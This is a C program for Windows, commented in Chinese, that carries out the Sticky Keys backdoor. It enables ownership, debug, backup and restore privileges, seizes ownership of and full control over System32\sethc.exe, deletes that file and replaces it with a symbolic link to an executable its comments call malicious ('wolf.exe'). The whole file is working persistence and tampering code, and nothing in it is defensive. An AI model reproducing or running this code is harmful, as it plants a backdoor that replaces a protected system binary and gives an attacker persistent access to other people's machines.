#include <windows.h>
#include <stdio.h>
#include <aclapi.h>
#include <sddl.h>

BOOLEAN (WINAPI * pCreateSymbolicLinkA)(
  LPCSTR lpSymlinkFileName,
  LPCSTR lpTargetFileName,
  DWORD  dwFlags
);

//设置权限
BOOL setPrivilege(LPCTSTR priv) {
  HANDLE token;
  TOKEN_PRIVILEGES tp;
  LUID luid;
  BOOL res = TRUE;

  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
  if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;
  if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
  printf(res ? "Successfully enable %s :)\n" : "Failed to enable %s :(\n", priv);
  return res;
}

int main() {
  //合法可执行程序路径
  const char* legitApp = "C:\\Windows\\System32\\sethc.exe";
  //恶意可执行程序路径
  const char* WolfApp = " C:\\Users\\Administrator\\Desktop\\test\\malicious\\pre\\wolf.exe ";

  if (!setPrivilege(SE_TAKE_OWNERSHIP_NAME)) return -1;
  if (!setPrivilege(SE_DEBUG_NAME)) return -1;
  if (!setPrivilege(SE_RESTORE_NAME)) return -1;
  if (!setPrivilege(SE_BACKUP_NAME)) return -1;

  HANDLE hFile = CreateFileA((LPCSTR)legitApp, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

  //获取当前用户SID值
  HANDLE hToken;
  DWORD dwSize = 0;
  PTOKEN_USER pTokenUser = NULL;
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
    printf("Failed to open process token: %d\n", GetLastError());
    CloseHandle(hFile);
    return 1;
  }
  printf("Open process token: ok\n");
  GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
  pTokenUser = (PTOKEN_USER)malloc(dwSize);
  if (pTokenUser == NULL) {
    printf("Failed to allocate memory for token information\n");
    CloseHandle(hToken);
    CloseHandle(hFile);
    return 1;
  }
  printf("Allocate memory token info: ok\n");

  //获取Token信息
  if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
    printf("Failed to get token information: %d\n", GetLastError());
    free(pTokenUser);
    CloseHandle(hToken);
    CloseHandle(hFile);
    return 1;
  }
  printf("Get token info: ok\n");
  SECURITY_DESCRIPTOR sd;
  if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION)) {
    printf("Failed to initialize security descriptor: %d\n", GetLastError());
    free(pTokenUser);
    CloseHandle(hToken);
    CloseHandle(hFile);
    return 1;
  }
  printf("Init security descriptor: ok\n");
  if (!SetSecurityDescriptorOwner(&sd, pTokenUser->User.Sid, FALSE)) {
    printf("Failed to set security descriptor owner: %d\n", GetLastError());
    free(pTokenUser);
    CloseHandle(hToken);
    CloseHandle(hFile);
    return 1;
  }
  printf("Setting security descriptor owner: ok\n");
  if (!SetFileSecurityA(legitApp, OWNER_SECURITY_INFORMATION, &sd)) {
    printf("Error setting file ownership: %d\n", GetLastError());
    free(pTokenUser);
    CloseHandle(hToken);
    CloseHandle(hFile);
    return 1;
  }
  printf("Setting file ownership: ok\n");

  //为当前用户设置完全控制权限
  EXPLICIT_ACCESS ea;
  PACL pNewAcl = NULL;

  ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
  ea.grfAccessPermissions = GENERIC_ALL;
  ea.grfAccessMode = SET_ACCESS;
  ea.grfInheritance = NO_INHERITANCE;
  ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
  ea.Trustee.TrusteeType = TRUSTEE_IS_USER;
  ea.Trustee.ptstrName = (LPSTR)pTokenUser->User.Sid;
  if (SetEntriesInAcl(1, &ea, NULL, &pNewAcl) != ERROR_SUCCESS) {
    printf("Error setting new ACL: %d\n", GetLastError());
    free(pTokenUser);
    CloseHandle(hToken);
    CloseHandle(hFile);
    return 1;
  }
  printf("Setting new ACL: ok\n");

  if (SetSecurityInfo(hFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pNewAcl, NULL) != ERROR_SUCCESS) {
    printf("Error setting security info: %d\n", GetLastError());
    free(pTokenUser);
    CloseHandle(hToken);
    CloseHandle(hFile);
    LocalFree(pNewAcl);
    return 1;
  }
  printf("Setting security info: ok\n");
  free(pTokenUser);
  CloseHandle(hToken);
  LocalFree(pNewAcl);

  //通过管理权限删除原始文件
  if (!DeleteFileA((LPCSTR)legitApp)) {
    printf("error deleting original file: %d\n", GetLastError());
    return 1;
  }
  printf("Deleted file successfully\n");
  CloseHandle(hFile);

  HMODULE kernel = GetModuleHandle("kernel32.dll");
  pCreateSymbolicLinkA = (BOOLEAN(WINAPI *)(LPCSTR, LPCSTR, DWORD))GetProcAddress(kernel, (LPCSTR)"CreateSymbolicLinkA");

  //创建符号链接
  if (!pCreateSymbolicLinkA((LPCSTR)legitApp, (LPCSTR)WolfApp, 0)) {
    printf("Error creating symlink: %d\n", GetLastError());
    return 1;
  }

  printf("Symlink created successfully\n");
  return 0;
}
